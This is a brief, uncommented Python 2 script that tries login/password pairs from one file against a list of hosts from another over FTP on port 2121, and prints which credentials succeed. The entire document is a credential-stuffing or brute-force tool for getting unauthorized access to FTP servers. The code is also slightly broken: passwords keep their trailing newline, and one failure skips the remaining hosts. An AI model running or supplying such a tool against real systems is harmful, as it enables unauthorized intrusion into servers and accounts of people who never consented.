#-*- coding: UTF-8 -*-
from ftplib import FTP 
if __name__=='__main__':
    for i in open("f2.txt"):
        try:                         
            ftp = FTP()
            for x in open("fx.txt"):            	
            	ftp.connect(x.strip(),'2121')            
            	ftp.login(i.split(':')[0],i.split(':')[1])
            	print 'Success:'+i.strip()+":"+x.strip()
        except Exception, e:
            print i.split(':')[0]+":"+str(e)+" >> "+x.strip()
            continue    
